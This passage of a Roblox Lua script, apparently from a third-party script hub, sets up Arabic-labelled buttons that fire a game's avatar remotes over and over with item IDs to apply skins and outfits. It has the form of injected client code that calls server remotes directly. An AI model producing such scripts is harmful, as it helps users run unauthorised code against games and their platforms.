  wait(0.4)
  local args = {
    [1] = 8902806997
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 12719043468
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 73342575980321
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 121191734883063
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 116918306368653
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 16729315650
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 16127830905
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15519708781
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.8)
local args = {
    [1] = 12320559736
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.3)
local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.4)
local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.3)
local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.8)
local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سكن ولد 6", 	Callback = function()

local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 4637265517,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 14808924884
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15848163279
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 16127830905
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15535076528
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13575374227
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 11984960300
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 6433477241
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 14659003969
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 7667832719
} 

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(5.0)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 4637265517,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(3.7)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 3210773801
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "skintone",
    [2] = "Institutional white"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
end })

Tab:AddButton({ 	Name  = "سكن ولد 7", 	Callback = function()

local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 4637265517,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 134082579
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
local args = {
    [1] = "wear",
    [2] = 91078281931212
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15581867745
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 15188738427
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 121979595367770
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(5.0)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 4637265517,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(3.7)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 134082579
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 1
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "skintone",
    [2] = "Institutional white"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
end })

Tab:AddButton({ 	Name  = "سكن ولد 8", 	Callback = function()

local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 139607718,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 17754346388,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 134082579
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
local args = {
    [1] = "wear",
    [2] = 140150480026352
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 82992820037885
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 13498671093
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 17386216598
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 14774768752
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 81526836860931
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 14832120928
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 5727822995
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 18594685747
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 18693879614
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(5.0)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 17754346388,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 1
    },
    [3] = "YinHub"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(3.7)
 
local args = {
    [1] = "CharacterChange",
    [2] = {
        [1] = 1,
        [2] = 1,
        [3] = 1,
        [4] = 1,
        [5] = 1,
        [6] = 134082579
    },
    [3] = "Roblox20"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 83289659312825
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "wear",
    [2] = 12249790024
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
wait(0.1)
 
local args = {
    [1] = "skintone",
    [2] = "Institutional white"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Updat1eAvata1r"):FireServer(unpack(args))
 
end })

local Section = Tab:AddSection({
	Name = "سكنات التطقيمات"
})

Tab:AddButton({ 	Name  = "تطقيم سكن بنت ابيض", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 71523705002059
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 133739083878132
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12491805479
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 17812777774
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12642699915
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 9207509028
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 6323672306
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 17885542271
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 17744851762
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 89320309255381
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 10714603421
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 13153798277
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 17486162984
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.4)
local args = {
    [1] = 17321153635
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.6)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.6)
local args = {
    [1] = {
        [1] = 115745153758680,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تطقيم سكن ولد ابيض", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  
  wait(0.2)
  local args = {
    [1] = 12871866840
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 12324916270
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 17812757369
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 17330476501
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 18164942938
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 82015366838137
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 18203491026
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تطقيم بنت احمر", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 13153798277
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 8275222163
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 17577949104
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 17744851762
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15343119229
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 84206973218163
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 131767886983906
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12563952028
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 6995267080
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 13849640889
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 13463280917
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12483105503
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 14388001192
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.6)
local args = {
    [1] = 14398993174
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = 14398986629
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.6)
local args = {
    [1] = {
        [1] = 115745153758680,
        [2] = 76683091425509,
        [3] = 75159926897589,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.7)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تطقيم ولد احمر", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12553856439
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 15618243532
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15848163279
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 15530783724
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15294026484
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 12563952028
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 131767886983906
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 5859953144
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 6995267080
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 13463280917
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 12483105503
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.6)
local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تطقيم بنت جلدي اسود", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = 73808851901807
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 114487356855004
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 3062282619
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 8760264049
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 18522484489
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 17744851762
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 13900309877
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 10714603421
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 13154819267
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 85199815817187
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 17627081584
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 12483105503
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 13463280917
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

wait(0.5)
local args = {
    [1] = {
        [1] = 15282063616,
        [2] = 14976777566,
        [3] = 14976777585,
        [4] = 14538400463,
        [5] = 14538400387,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

wait(0.7)
local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "تطقيم ولد جلدي اسود", 	Callback = function()
local args = {
    [1] = "OCA";
}

game:GetService("ReplicatedStorage"):WaitForChild("RE", 9e9):WaitForChild("1Avata1rOrigina1l", 9e9):FireServer(unpack(args))
  wait(0.2)
  local args = {
    [1] = {
        [1] = 92757812011061,
        [2] = 99519402284266,
        [3] = 115905570886697,
        [4] = 0,
        [5] = 0,
        [6] = 1
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = {
        [1] = 0,
        [2] = 0,
        [3] = 0,
        [4] = 0,
        [5] = 0,
        [6] = 3210773801
    }
}

game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 73808851901807
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.5)
  local args = {
    [1] = 114487356855004
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.6)
  local args = {
    [1] = 15197532379
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.7)
  local args = {
    [1] = 12754522665
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15474892096
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.4)
  local args = {
    [1] = 15547027816
}

game:GetService("ReplicatedStorage").Remotes.Wear:InvokeServer(unpack(args))

  wait(0.3)
  local args = {
    [1] = 15848166908
}

